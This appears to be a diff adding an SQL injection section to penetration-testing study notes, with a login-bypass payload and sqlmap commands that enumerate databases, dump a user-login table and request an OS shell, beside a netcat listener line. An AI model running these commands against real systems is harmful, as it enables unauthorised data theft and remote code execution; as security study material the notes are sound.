@@ -235,6 +235,34 @@ run
 nc -vnl -p 1234
 ```
   
+### SQL Injection
+> Login bypass with [' or 1=1 --](https://github.com/mrsuman2002/SQL-Injection-Authentication-Bypass-Cheat-Sheet/blob/master/SQL%20Injection%20Cheat%20Sheet.txt) 
+> [N-Stalker](https://www.nstalker.com/) : Select OWASP Policy => Scan Website for Vulnerabilites
+ 
+> SQLMAP
+  
+```shell
+#List databases, add cookie values
+sqlmap -u "http:domain.com/path.aspx?id=1" --cookie="dcsdvsdvsdv;uitabs=0" --dbs  
+
+# List Tables, add databse name
+sqlmap -u "http:domain.com/path.aspx?id=1" --cookie="dcsdvsdvsdv;uitabs=0" -D database_name --tables  
+  
+# List Columns of that table
+sqlmap -u "http:domain.com/path.aspx?id=1" --cookie="dcsdvsdvsdv;uitabs=0" -D database_name -T table_name_user_login --columns
+  
+#Dump all values of the table
+sqlmap -u "http:domain.com/path.aspx?id=1" --cookie="dcsdvsdvsdv;uitabs=0" -D database_name -T table_name_user_login --dump
+  
+
+sqlmap -u "http:domain.com/path.aspx?id=1" --cookie="dcsdvsdvsdv;uitabs=0" --os-shell
+
+  
+```
+  
+  
+  
+  
 </details>
 
 <details>
